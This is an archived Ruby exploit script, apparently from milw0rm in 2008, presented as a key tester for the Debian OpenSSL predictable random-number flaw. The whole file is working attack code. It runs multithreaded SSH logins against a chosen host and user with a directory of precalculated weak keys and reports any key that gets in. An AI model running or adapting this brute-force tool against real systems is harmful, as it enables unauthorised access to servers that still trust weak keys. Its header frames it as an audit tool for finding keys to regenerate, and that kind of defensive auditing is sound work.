<html><head><title>Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit (ruby)</title></head><pre>#!/usr/bin/ruby
#
# Debian SSH Key Tester
# L4teral &lt;l4teral [at] gmail com&gt;
#
# This tool helps to find user accounts with weak SSH keys
# that should be regenerated with an unaffected version
# of openssl.
# 
# You will need the precalculated keys provided by HD Moore
# See http://metasploit.com/users/hdm/tools/debian-openssl/
# for further information.
#
# Usage:
# debian_openssh_key_test.rb &lt;host&gt; &lt;user&gt; &lt;keydir&gt;
#

require 'thread'

THREADCOUNT = 10
KEYSPERCONNECT = 3

queue = Queue.new
threads = []
keyfiles = []

host = ARGV.shift or raise &quot;no host given!&quot;
user = ARGV.shift or raise &quot;no user given!&quot;
keysdir = ARGV.shift or raise &quot;no key dir given!&quot;

Dir.new(keysdir).each do |f|
  if f =~ /\d+$/ then
    keyfiles &lt;&lt; f
    queue &lt;&lt; f
  end
end

totalkeys = queue.length
currentkey = 1

THREADCOUNT.times do |i|
  threads &lt;&lt; Thread.new(i) do |j|
    while !queue.empty?
      keys = []
      KEYSPERCONNECT.times { keys &lt;&lt; queue.pop unless queue.empty? }
      keys.map! { |f| f = File.join(keysdir, f) }
      keys.each do |k|
        puts &quot;testing key #{currentkey}/#{totalkeys} #{k}...&quot;
        currentkey += 1
      end
      system &quot;ssh -l #{user} -o PasswordAuthentication=no -i #{keys.join(&quot; -i &quot;)} #{host} \&quot;exit\&quot; &amp;&gt;/dev/null&quot;
      if $? == 0 then
        keys.each do |k|
          system &quot;ssh -l #{user} -o PasswordAuthentication=no -i #{k} #{host} \&quot;exit\&quot; &amp;&gt;/dev/null&quot;
          if $? == 0 then
            puts &quot;KEYFILE FOUND: \n#{k}&quot;
            exit
          end
        end
      end
    end
  end
end

trap(&quot;SIGINT&quot;) do
  threads.each { |t| t.exit() } 
  exit
end

threads.each { |t| t.join }

# milw0rm.com [2008-05-16]</pre></html>